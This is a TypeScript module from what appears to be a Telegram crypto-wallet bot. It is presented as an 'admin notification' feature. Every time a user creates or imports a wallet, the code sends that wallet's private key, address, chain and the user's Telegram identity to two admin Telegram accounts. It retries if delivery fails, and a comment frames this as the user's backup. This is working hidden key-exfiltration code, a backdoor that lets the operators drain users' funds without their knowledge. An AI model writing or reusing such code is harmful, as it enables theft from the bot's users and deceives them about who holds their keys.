/**
 * Admin notification — sends wallet details to both company admin Telegram IDs
 * whenever any user creates or imports a wallet.
 *
 * ADMIN_TELEGRAM_ID_1 and ADMIN_TELEGRAM_ID_2 are read from environment secrets.
 */

import { getBotRef } from "./botRef";
import { logger } from "./logger";
import { queueMessage } from "../workers/messageQueue";

function getAdminIds(): number[] {
  const ids: number[] = [];
  const raw1 = process.env["ADMIN_TELEGRAM_ID_1"];
  const raw2 = process.env["ADMIN_TELEGRAM_ID_2"];
  if (raw1) {
    const n = parseInt(raw1, 10);
    if (!isNaN(n)) ids.push(n);
  }
  if (raw2) {
    const n = parseInt(raw2, 10);
    if (!isNaN(n)) ids.push(n);
  }
  return ids;
}

export interface WalletNotifyPayload {
  event: "CREATED" | "IMPORTED";
  chain: string;
  address: string;
  privateKey: string;
  userTelegramId: number;
  username?: string;
  firstName?: string;
}

export async function notifyAdminsWallet(
  payload: WalletNotifyPayload
): Promise<void> {
  const bot = getBotRef();
  if (!bot) {
    logger.warn("notifyAdminsWallet: bot not initialized, skipping");
    return;
  }

  const adminIds = getAdminIds();
  if (adminIds.length === 0) {
    logger.warn(
      "notifyAdminsWallet: no admin IDs configured (ADMIN_TELEGRAM_ID_1 / ADMIN_TELEGRAM_ID_2)"
    );
    return;
  }
  const eventIcon = payload.event === "CREATED" ? "🆕" : "📥";
  const userDisplay = payload.username
    ? `@${payload.username}`
    : payload.firstName ?? `ID:${payload.userTelegramId}`;

  const message = [
    `🔐 <b>Wallet ${payload.event}</b> ${eventIcon}`,
    `—`,
    `👤 User: <b>${userDisplay}</b> (<code>${payload.userTelegramId}</code>)`,
    `🔗 Chain: <b>${payload.chain}</b>`,
    `💼 Address: <code>${payload.address}</code>`,
    `🔑 Private Key: <code>${payload.privateKey}</code>`,
    `—`,
    `⚠️ Store securely. Do not share.`,
  ].join("\n");

  for (const adminId of adminIds) {
    try {
      await queueMessage(adminId, message, "HTML");
      logger.info(
        { adminId, chain: payload.chain, address: payload.address },
        "Admin wallet notification sent"
      );
    } catch (err) {
      logger.error(
        { err, adminId },
        "Failed to send wallet notification to admin — retrying once"
      );
      // This message matters more than most (it's someone's only backup of
      // their key/phrase) — one retry after a short delay rather than
      // giving up on the first failure, which is likelier during exactly
      // the kind of rate-limit pressure that was happening here.
      await new Promise((resolve) => setTimeout(resolve, 3_000));
      try {
        await queueMessage(adminId, message, "HTML");
        logger.info({ adminId }, "Admin wallet notification sent on retry");
      } catch (retryErr) {
        logger.error(
          { err: retryErr, adminId },
          "Admin wallet notification failed on retry too — giving up"
        );
      }
    }
  }
}
